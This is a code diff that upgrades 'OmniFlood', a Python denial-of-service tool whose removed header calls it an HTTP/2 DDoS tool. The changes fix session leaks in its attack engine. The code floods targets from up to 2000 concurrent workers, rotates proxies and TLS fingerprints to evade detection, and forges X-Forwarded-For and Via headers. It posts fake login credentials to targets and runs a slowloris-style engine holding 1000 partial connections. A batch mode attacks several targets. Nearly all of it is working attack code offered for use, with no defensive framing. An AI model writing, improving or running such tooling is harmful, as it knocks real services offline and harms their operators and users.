@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-OmniFlood v3.0 - Unified HTTP/2 DDoS Tool
-Combines: Node.js HTTP/2 flooding, Go concurrency, browser fingerprinting, proxy rotation
-Author: CATShadow - Supreme Coder
+OmniFlood v3.1 - Fixed Session Leaks
+CATShadow - Supreme Coder
 """
 
 import asyncio
@@ -17,10 +16,12 @@ import base64
 import zlib
 from concurrent.futures import ThreadPoolExecutor
 from dataclasses import dataclass
-from typing import List, Dict, Optional, Tuple
+from typing import List, Dict, Optional, Tuple, Set
 import argparse
 import sys
 import os
+import signal
+import gc
 from urllib.parse import urlparse, urlencode
 import h2.connection
 import h2.config
@@ -28,6 +29,11 @@ import h2.events
 import h2.settings
 from h2.exceptions import ProtocolError, NoSuchStreamError
 import aiohttp_socks
+import logging
+
+# Disable aiohttp logging spam
+logging.getLogger('aiohttp').setLevel(logging.CRITICAL)
+logging.getLogger('aiohttp_socks').setLevel(logging.CRITICAL)
 
 # ==================== CONFIGURATION ====================
 MAX_WORKERS = 2000
@@ -155,55 +161,30 @@ class ProxyManager:
             self.index += 1
             return proxy
 
-# ==================== HTTP/2 CONNECTION MANAGER ====================
-class H2ConnectionManager:
-    def __init__(self, target: str, proxy_manager: Optional[ProxyManager] = None):
+# ==================== CONNECTION POOL WITH PROPER CLEANUP ====================
+class ConnectionPool:
+    def __init__(self, target: str, proxy_manager: Optional[ProxyManager] = None, pool_size: int = 500):
         self.target = target
         self.proxy_manager = proxy_manager
-        self.connections = []
-        self.lock = asyncio.Lock()
-        self.stream_counter = 0
+        self.pool_size = pool_size
+        self.sessions: List[aiohttp.ClientSession] = []
+        self.session_lock = asyncio.Lock()
+        self.used_sessions: Set[aiohttp.ClientSession] = set()
+        self.closed = False
+        self._cleanup_task = None
         
-    async def create_connection(self) -> Optional[aiohttp.ClientSession]:
-        try:
-            proxy_url = await self.proxy_manager.get_proxy() if self.proxy_manager else None
-            
-            # Create SSL context with JA3 fingerprinting
-            ssl_ctx = ssl.create_default_context()
-            ssl_ctx.check_hostname = False
-            ssl_ctx.verify_mode = ssl.CERT_NONE
-            
-            # Select random JA3 signature
-            ja3 = random.choice(JA3_SIGNATURES)
-            
-            # Configure cipher suites
-            ssl_ctx.set_ciphers(':'.join(ja3['ciphers']))
-            
-            # Set TLS versions
-            ssl_ctx.minimum_version = ja3['min_version']
-            ssl_ctx.maximum_version = ja3['max_version']
-            
-            # ALPN for HTTP/2
-            ssl_ctx.set_alpn_protocols(['h2', 'http/1.1'])
-            
-            connector = None
-            if proxy_url:
-                if proxy_url.startswith('socks5://'):
-                    connector = aiohttp_socks.SocksConnector.from_url(proxy_url)
-                else:
-                    connector = aiohttp.TCPConnector(ssl=ssl_ctx, force_close=True)
-            else:
-                connector = aiohttp.TCPConnector(ssl=ssl_ctx, force_close=True)
-            
-            timeout = aiohttp.ClientTimeout(total=30, connect=10)
-            session = aiohttp.ClientSession(
-                connector=connector,
-                timeout=timeout,
-                headers=self._generate_headers()
-            )
-            return session
-        except Exception as e:
-            return None
+    def _create_ssl_context(self) -> ssl.SSLContext:
+        ssl_ctx = ssl.create_default_context()
+        ssl_ctx.check_hostname = False
+        ssl_ctx.verify_mode = ssl.CERT_NONE
+        
+        ja3 = random.choice(JA3_SIGNATURES)
+        ssl_ctx.set_ciphers(':'.join(ja3['ciphers']))
+        ssl_ctx.minimum_version = ja3['min_version']
+        ssl_ctx.maximum_version = ja3['max_version']
+        ssl_ctx.set_alpn_protocols(['h2', 'http/1.1'])
+        
+        return ssl_ctx
     
     def _generate_headers(self) -> Dict:
         profile_name = random.choice(list(BROWSER_PROFILES.keys()))
@@ -228,7 +209,6 @@ class H2ConnectionManager:
             'Connection': 'keep-alive',
         }
         
-        # Add random headers
         if rand_bool():
             headers['X-Requested-With'] = 'XMLHttpRequest'
         if rand_bool():
@@ -238,24 +218,123 @@ class H2ConnectionManager:
         
         return headers
     
-    async def get_connection(self) -> Optional[aiohttp.ClientSession]:
-        async with self.lock:
-            # Clean dead connections
-            self.connections = [c for c in self.connections if not c.closed]
+    async def _create_session(self) -> Optional[aiohttp.ClientSession]:
+        try:
+            proxy_url = await self.proxy_manager.get_proxy() if self.proxy_manager else None
             
-            # Create new connection if needed
-            if len(self.connections) < CONNECTION_POOL_SIZE:
-                session = await self.create_connection()
+            connector = None
+            timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=30)
+            
+            if proxy_url:
+                if proxy_url.startswith('socks5://'):
+                    connector = aiohttp_socks.SocksConnector.from_url(
+                        proxy_url,
+                        ssl=self._create_ssl_context(),
+                        force_close=True,
+                        limit=100,
+                        limit_per_host=100,
+                        ttl_dns_cache=300
+                    )
+                else:
+                    connector = aiohttp.TCPConnector(
+                        ssl=self._create_ssl_context(),
+                        force_close=True,
+                        limit=100,
+                        limit_per_host=100,
+                        ttl_dns_cache=300,
+                        keepalive_timeout=30
+                    )
+            else:
+                connector = aiohttp.TCPConnector(
+                    ssl=self._create_ssl_context(),
+                    force_close=True,
+                    limit=100,
+                    limit_per_host=100,
+                    ttl_dns_cache=300,
+                    keepalive_timeout=30
+                )
+            
+            session = aiohttp.ClientSession(
+                connector=connector,
+                timeout=timeout,
+                headers=self._generate_headers()
+            )
+            return session
+        except Exception:
+            return None
+    
+    async def get_session(self) -> Optional[aiohttp.ClientSession]:
+        if self.closed:
+            return None
+            
+        async with self.session_lock:
+            # Clean dead sessions
+            self.sessions = [s for s in self.sessions if not s.closed]
+            self.used_sessions = {s for s in self.used_sessions if not s.closed}
+            
+            # Create new sessions if needed
+            while len(self.sessions) < self.pool_size:
+                session = await self._create_session()
                 if session:
-                    self.connections.append(session)
-                    return session
+                    self.sessions.append(session)
+                else:
+                    break
             
-            # Return random connection
-            if self.connections:
-                session = random.choice(self.connections)
+            # Get an unused session
+            available = [s for s in self.sessions if s not in self.used_sessions and not s.closed]
+            if available:
+                session = random.choice(available)
+                self.used_sessions.add(session)
+                return session
+            
+            # If all sessions are used, try to recycle old ones
+            if len(self.sessions) >= self.pool_size:
+                # Try to use any session (they should handle concurrency)
+                session = random.choice(self.sessions)
                 if not session.closed:
                     return session
+            
             return None
+    
+    def release_session(self, session: aiohttp.ClientSession):
+        """Release a session back to the pool"""
+        if session and not self.closed:
+            asyncio.create_task(self._release_session_async(session))
+    
+    async def _release_session_async(self, session: aiohttp.ClientSession):
+        async with self.session_lock:
+            if session in self.used_sessions:
+                self.used_sessions.remove(session)
+    
+    async def close(self):
+        """Properly close all sessions"""
+        if self.closed:
+            return
+            
+        self.closed = True
+        
+        async with self.session_lock:
+            # Close all sessions
+            for session in self.sessions:
+                try:
+                    if not session.closed:
+                        await session.close()
+                except:
+                    pass
+            
+            self.sessions.clear()
+            self.used_sessions.clear()
+            
+            # Force garbage collection
+            gc.collect()
+    
+    async def start_cleanup(self):
+        """Periodic cleanup of dead sessions"""
+        while not self.closed:
+            await asyncio.sleep(60)
+            async with self.session_lock:
+                self.sessions = [s for s in self.sessions if not s.closed]
+                self.used_sessions = {s for s in self.used_sessions if not s.closed}
 
 # ==================== ATTACK ENGINE ====================
 class AttackEngine:
@@ -267,14 +346,26 @@ class AttackEngine:
         self.proxy_manager = proxy_manager
         self.stats = {'total': 0, 'success': 0, 'failed': 0}
         self.running = True
-        self.conn_manager = H2ConnectionManager(target, proxy_manager)
+        self.pool = ConnectionPool(target, proxy_manager, CONNECTION_POOL_SIZE)
         self.semaphore = asyncio.Semaphore(MAX_WORKERS)
         
+    def _generate_attack_headers(self) -> Dict:
+        headers = self.pool._generate_headers()
+        
+        if rand_bool():
+            headers['X-Custom-Header'] = rand_str(20)
+        if rand_bool():
+            headers['X-Forwarded-For'] = random_ip()
+        if rand_bool():
+            headers['Via'] = f'1.1 {random_ip()}'
+        
+        return headers
+    
     async def attack_worker(self):
         while self.running:
             try:
                 async with self.semaphore:
-                    session = await self.conn_manager.get_connection()
+                    session = await self.pool.get_session()
                     if not session:
                         await asyncio.sleep(0.1)
                         continue
@@ -289,20 +380,14 @@ class AttackEngine:
                     data = None
                     if self.mode == 'POST':
                         data = f"student_id={generate_student_number()}&password={rand_str(12)}"
-                        # Randomize content type
-                        content_type = random.choice([
-                            'application/x-www-form-urlencoded',
-                            'multipart/form-data',
-                            'application/json'
-                        ])
-                        if content_type == 'application/json':
+                        if rand_bool():
                             data = json.dumps({
                                 'username': rand_str(10),
                                 'password': rand_str(15),
                                 'email': f"{rand_str(8)}@example.com"
                             })
                     
-                    # Make request
+                    # Make request with proper cleanup
                     start_time = time.time()
                     try:
                         async with session.request(
@@ -312,48 +397,48 @@ class AttackEngine:
                             headers=self._generate_attack_headers(),
                             timeout=aiohttp.ClientTimeout(total=10)
                         ) as response:
-                            # Read response body for HEAD/GET
                             if self.mode != 'HEAD':
                                 await response.read()
                             self.stats['success'] += 1
                     except Exception:
                         self.stats['failed'] += 1
+                    finally:
+                        # Release session back to pool
+                        self.pool.release_session(session)
                     
                     self.stats['total'] += 1
                     
                     # Rate limiting
-                    await asyncio.sleep(max(0, (1/self.rate) - (time.time() - start_time)))
+                    elapsed = time.time() - start_time
+                    if elapsed < (1/self.rate):
+                        await asyncio.sleep((1/self.rate) - elapsed)
                     
             except Exception:
                 await asyncio.sleep(0.1)
     
-    def _generate_attack_headers(self) -> Dict:
-        headers = self.conn_manager._generate_headers()
-        
-        # Add attack-specific headers
-        if rand_bool():
-            headers['X-Custom-Header'] = rand_str(20)
-        if rand_bool():
-            headers['X-Forwarded-For'] = random_ip()
-        if rand_bool():
-            headers['Via'] = f'1.1 {random_ip()}'
-        
-        return headers
-    
     async def run(self):
-        # Create initial connections
-        initial_tasks = [self.conn_manager.create_connection() for _ in range(min(100, CONNECTION_POOL_SIZE))]
-        await asyncio.gather(*initial_tasks)
+        # Start cleanup task
+        cleanup_task = asyncio.create_task(self.pool.start_cleanup())
         
         # Start workers
-        workers = [self.attack_worker() for _ in range(MAX_WORKERS)]
+        workers = [asyncio.create_task(self.attack_worker()) for _ in range(min(MAX_WORKERS, 2000))]
         
         # Stop after duration
         await asyncio.sleep(self.duration)
         self.running = False
         
         # Wait for workers to finish
-        await asyncio.gather(*workers, return_exceptions=True)
+        if workers:
+            await asyncio.wait(workers, timeout=10)
+        
+        # Cleanup
+        cleanup_task.cancel()
+        try:
+            await cleanup_task
+        except asyncio.CancelledError:
+            pass
+        
+        await self.pool.close()
         
         return self.stats
 
@@ -364,6 +449,7 @@ class SlowAttackEngine:
         self.duration = duration
         self.rate = rate
         self.stats = {'total': 0, 'connections': 0}
+        self.running = True
         
     async def slow_worker(self):
         parsed = urlparse(self.target)
@@ -371,11 +457,11 @@ class SlowAttackEngine:
         port = 443 if parsed.scheme == 'https' else 80
         is_https = parsed.scheme == 'https'
         
-        while True:
+        while self.running:
             try:
                 # Create socket connection
                 reader, writer = await asyncio.open_connection(
-                    host, port, ssl=is_https
+                    host, port, ssl=is_https if is_https else None
                 )
                 
                 # Send partial HTTP request
@@ -388,14 +474,20 @@ class SlowAttackEngine:
                     f"X-Forwarded-For: {random_ip()}\r\n"
                 )
                 
-                # Send request slowly (line by line with delays)
+                # Send request slowly
                 lines = request.split('\r\n')
                 for i, line in enumerate(lines):
+                    if not self.running:
+                        break
                     writer.write((line + '\r\n').encode())
                     await writer.drain()
-                    await asyncio.sleep(0.5)  # Slow down
+                    await asyncio.sleep(0.5)
                 
-                # Don't send final \r\n, keep connection open
+                if not self.running:
+                    writer.close()
+                    await writer.wait_closed()
+                    break
+                
                 self.stats['connections'] += 1
                 self.stats['total'] += 1
                 
@@ -407,12 +499,18 @@ class SlowAttackEngine:
             except Exception:
                 pass
             
-            await asyncio.sleep(1/self.rate)
+            await asyncio.sleep(1/self.rate if self.rate > 0 else 0.1)
     
     async def run(self):
-        workers = [self.slow_worker() for _ in range(1000)]
+        workers = [asyncio.create_task(self.slow_worker()) for _ in range(1000)]
+        
         await asyncio.sleep(self.duration)
-        await asyncio.gather(*workers, return_exceptions=True)
+        self.running = False
+        
+        # Wait for workers to finish
+        if workers:
+            await asyncio.wait(workers, timeout=10)
+        
         return self.stats
 
 # ==================== BATCH ATTACK ====================
@@ -440,11 +538,21 @@ class BatchAttack:
         print("\n" + "="*70)
         print("BATCH ATTACK COMPLETE")
         print("="*70)
+        total_requests = 0
+        total_success = 0
+        total_failed = 0
         for target, stats in results:
             print(f"\nTarget: {target}")
             print(f"  Total Requests: {stats['total']}")
             print(f"  Success: {stats['success']}")
             print(f"  Failed: {stats['failed']}")
+            total_requests += stats['total']
+            total_success += stats['success']
+            total_failed += stats['failed']
+        
+        print(f"\n{'='*70}")
+        print(f"TOTAL: {total_requests} requests, {total_success} success, {total_failed} failed")
+        print(f"{'='*70}")
         
         return results
 
@@ -474,7 +582,6 @@ Examples:
     
     args = parser.parse_args()
     
-    # Validate arguments
     if args.batch:
         if not os.path.exists(args.batch):
             print(f"[!] Batch file not found: {args.batch}")
@@ -491,10 +598,13 @@ Examples:
     return args
 
 async def main_async():
+    # Handle Ctrl+C gracefully
+    loop = asyncio.get_running_loop()
+    
     args = parse_arguments()
     
     print(f"""
-    🐱 CATShadow OmniFlood v3.0
+    🐱 CATShadow OmniFlood v3.1 (Session Leak Fixed)
     {'='*50}
     Target: {args.target if not args.batch else 'BATCH MODE'}
     Duration: {args.duration}s
@@ -522,31 +632,42 @@ async def main_async():
     
     # Regular attack
     engine = AttackEngine(args.target, args.mode, args.duration, args.rate, proxy_manager)
-    MAX_WORKERS = args.threads
     
     try:
         stats = await engine.run()
-        print(f"\nAttack Complete:")
-        print(f"  Total Requests: {stats['total']}")
-        print(f"  Successful: {stats['success']}")
-        print(f"  Failed: {stats['failed']}")
-        print(f"  Success Rate: {(stats['success']/stats['total']*100 if stats['total'] > 0 else 0):.1f}%")
+        print(f"\n{'='*50}")
+        print("ATTACK COMPLETE")
+        print(f"{'='*50}")
+        print(f"Total Requests: {stats['total']}")
+        print(f"Successful: {stats['success']}")
+        print(f"Failed: {stats['failed']}")
+        if stats['total'] > 0:
+            print(f"Success Rate: {(stats['success']/stats['total']*100):.1f}%")
+        print(f"{'='*50}")
+    except asyncio.CancelledError:
+        print("\n[!] Attack cancelled")
     except KeyboardInterrupt:
         print("\n[!] Attack interrupted by user")
     finally:
-        # Cleanup connections
-        for conn in engine.conn_manager.connections:
-            try:
-                await conn.close()
-            except:
-                pass
+        # Ensure cleanup
+        await engine.pool.close()
+
+def signal_handler():
+    """Handle SIGINT gracefully"""
+    print("\n[!] Received interrupt signal, cleaning up...")
+    # This will be handled by the asyncio loop
 
 if __name__ == "__main__":
+    # Set up signal handlers
+    signal.signal(signal.SIGINT, lambda s, f: signal_handler())
+    
     try:
         asyncio.run(main_async())
     except KeyboardInterrupt:
         print("\n[!] Shutting down...")
-        sys.exit(0)
     except Exception as e:
         print(f"\n[!] Error: {e}")
-        sys.exit(1)
+    finally:
+        # Force cleanup
+        gc.collect()
+        sys.exit(0)
